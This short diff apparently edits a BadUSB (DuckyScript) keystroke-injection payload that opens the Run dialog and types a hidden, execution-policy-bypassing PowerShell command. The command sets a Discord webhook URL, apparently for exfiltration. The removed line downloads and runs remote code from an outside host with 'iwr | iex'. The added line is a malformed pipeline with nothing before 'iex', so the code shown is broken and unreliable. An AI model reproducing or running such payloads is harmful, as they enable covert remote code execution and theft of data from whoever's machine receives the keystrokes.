@@ -21,5 +21,5 @@ REM     $dc='https://discord.com/api/webhooks/1108192935062818857/mV_LC9vCXETk2D
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass -command "$dc='https://discord.com/api/webhooks/1108192935062818857/mV_LC9vCXETk2D_JeCCAqEyhZre_44CKjOwtU4e9w4blQ3QVSaffe3mlvhipRi5CvUJt';$log='';$ks='';iwr 'https://jakoby.lol/m2m' | iex"
+STRING powershell -w h -NoP -Ep Bypass -command "$dc='https://discord.com/api/webhooks/1108192935062818857/mV_LC9vCXETk2D_JeCCAqEyhZre_44CKjOwtU4e9w4blQ3QVSaffe3mlvhipRi5CvUJt';$log='';$ks=''; | iex"
 ENTER
